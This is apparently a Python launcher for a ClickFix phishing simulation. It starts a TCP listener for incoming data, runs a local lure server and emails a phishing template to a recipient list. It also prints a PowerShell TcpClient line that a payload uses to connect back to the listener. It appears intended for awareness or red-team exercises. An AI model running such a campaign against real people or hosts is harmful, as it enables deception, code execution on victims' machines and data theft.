import subprocess
import time
import sys
import os
import threading
from datetime import datetime

# Try to load dotenv, but don't fail if it's not available
try:
    from dotenv import load_dotenv
    # Load environment variables from parent directory
    env_path = os.path.join(os.path.dirname(__file__), '..', '.env')
    load_dotenv(env_path)
    print("Environment variables loaded from .env file")
except ImportError:
    print("Warning: python-dotenv not installed. Environment variables won't be loaded from .env file.")
    print("Install with: pip install python-dotenv")
except Exception as e:
    print(f"Warning: Could not load .env file: {e}")

# Import the TCP listener
try:
    from tcp_listener import TCPListener
    TCP_LISTENER_AVAILABLE = True
except ImportError:
    print("Warning: TCP listener module not found")
    TCP_LISTENER_AVAILABLE = False

# Add phishing-module to Python path
PHISHING_MODULE_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'phishing-module'))
sys.path.insert(0, PHISHING_MODULE_PATH)

# --- CONFIGURATION ---
RECIPIENTS_FILE = os.path.join(PHISHING_MODULE_PATH, 'data', 'recipients.csv')
CLICKFIX_EMAIL_TEMPLATE = os.path.join(PHISHING_MODULE_PATH, 'templates', 'clickfix_email.html')

# Global variable to store the TCP listener
TCP_LISTENER_INSTANCE = None

# --- TCP Listener Functions ---
def start_tcp_listener():
    """Start the TCP listener in a separate thread"""
    global TCP_LISTENER_INSTANCE
    
    if not TCP_LISTENER_AVAILABLE:
        print("⚠️  TCP listener not available - skipping")
        return None
        
    try:
        TCP_LISTENER_INSTANCE = TCPListener(host='127.0.0.1', port=9999)
        
        # Start listener in a separate thread
        listener_thread = threading.Thread(target=TCP_LISTENER_INSTANCE.start_listener)
        listener_thread.daemon = True
        listener_thread.start()
        
        # Give the listener a moment to start
        time.sleep(1)
        print("✅ TCP Listener started on port 9999")
        return TCP_LISTENER_INSTANCE
        
    except Exception as e:
        print(f"❌ Failed to start TCP listener: {e}")
        return None

def stop_tcp_listener():
    """Stop the TCP listener"""
    global TCP_LISTENER_INSTANCE
    
    if TCP_LISTENER_INSTANCE:
        try:
            TCP_LISTENER_INSTANCE.stop_listener()
            TCP_LISTENER_INSTANCE = None
            print("🔇 TCP Listener stopped")
        except Exception as e:
            print(f"⚠️  Error stopping TCP listener: {e}")

def update_ps1_script_port():
    """Provides instructions for updating the PowerShell script port"""
    print("\n" + "="*60)
    print("📝 IMPORTANT: Update your PowerShell script to use port 9999")
    print("="*60)
    print("Change this line in your PowerShell script:")
    print("   OLD: $client = New-Object System.Net.Sockets.TcpClient(\"127.0.0.1\", 4444)")
    print("   NEW: $client = New-Object System.Net.Sockets.TcpClient(\"127.0.0.1\", 9999)")
    print("="*60)

# --- 1. Start the ClickFix Express server ---
def start_clickfix_server():
    print("Starting ClickFix Express server with npm start...")
    try:
        # Try npm directly first, then fallback to full path
        proc = subprocess.Popen(['npm', 'start'], cwd=os.path.dirname(__file__))
    except FileNotFoundError:
        # If npm is not in PATH, try the full path
        npm_path = r"C:\Program Files\nodejs\npm.cmd"
        proc = subprocess.Popen([npm_path, 'start'], cwd=os.path.dirname(__file__))
    
    print("Waiting for server to start...")
    time.sleep(5)
    print("ClickFix server should now be running on http://localhost:3001/clickfix")
    return proc

# --- 2. Send emails using the clickfix email template ---
def send_clickfix_emails():
    print("Sending ClickFix phishing emails...")
    try:
        # Import after adding to path
        from send_email import read_recipients, read_template, send_emails
        
        # Read recipients
        recipients = read_recipients(RECIPIENTS_FILE)
        if not recipients:
            print("Error: No recipients found!")
            return False
            
        # Read the clickfix email template
        template_html = read_template(CLICKFIX_EMAIL_TEMPLATE)
        if not template_html:
            print("Error: Could not read email template!")
            return False
            
        # Send emails
        send_emails(recipients, template_html)
        print(f"Successfully sent emails to {len(recipients)} recipients!")
        return True
        
    except ImportError as e:
        print(f"Error importing send_email module: {e}")
        return False
    except Exception as e:
        print(f"Error sending emails: {e}")
        return False

if __name__ == "__main__":
    print("=" * 50)
    print("Starting ClickFix Phishing Simulation")
    print("=" * 50)
    
    # Start the TCP listener first
    print("🔊 Starting TCP listener for incoming data...")
    tcp_listener = start_tcp_listener()
    update_ps1_script_port()
    
    # Start the server
    server_proc = start_clickfix_server()
    
    try:
        # Send the phishing emails
        email_success = send_clickfix_emails()
        
        if email_success:
            print("\n" + "=" * 50)
            print("ClickFix simulation started successfully!")
            print("Server running at: http://localhost:3001/clickfix")
            print("TCP Listener running on: 127.0.0.1:9999")
            print("Phishing emails have been sent!")
            print("Press Ctrl+C to stop the server.")
            print("=" * 50)
            
            # Keep the server running
            server_proc.wait()
        else:
            print("Failed to send emails. Stopping server...")
            server_proc.terminate()
            
    except KeyboardInterrupt:
        print("\nShutting down ClickFix simulation...")
        
        # Stop TCP listener
        stop_tcp_listener()
        
        # Stop server
        server_proc.terminate()
        server_proc.wait()
        print("ClickFix simulation stopped.")
        
    except Exception as e:
        print(f"An error occurred: {e}")
        
        # Stop TCP listener
        stop_tcp_listener()
        
        # Stop server
        server_proc.terminate()
        server_proc.wait()
